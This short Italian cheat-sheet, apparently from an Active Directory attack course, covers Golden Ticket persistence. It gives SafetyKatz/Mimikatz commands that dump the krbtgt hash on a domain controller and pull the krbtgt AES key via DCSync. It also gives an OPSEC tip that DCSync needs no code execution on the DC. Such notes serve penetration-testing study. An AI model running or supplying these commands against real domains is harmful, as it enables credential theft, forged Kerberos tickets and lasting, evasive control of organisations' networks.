# Persistence - Golden Ticket - Mimikatz

* Eseguire mimikatz (o una variante) sul DC come Domain Admin per ottenere l'hash krbtgt

```powershell
C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'
```

* Per utilizzare la feature DCSync al fine di ottenere AES key del krbtgt account. Utilizzare il comando sottostante con privilegi DA ( o con un utente che "replication rights" sull'oggetto di dominio

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

#### OPSEC: Utilizzare l'opzione DCSync non richiede code execution sul DC target
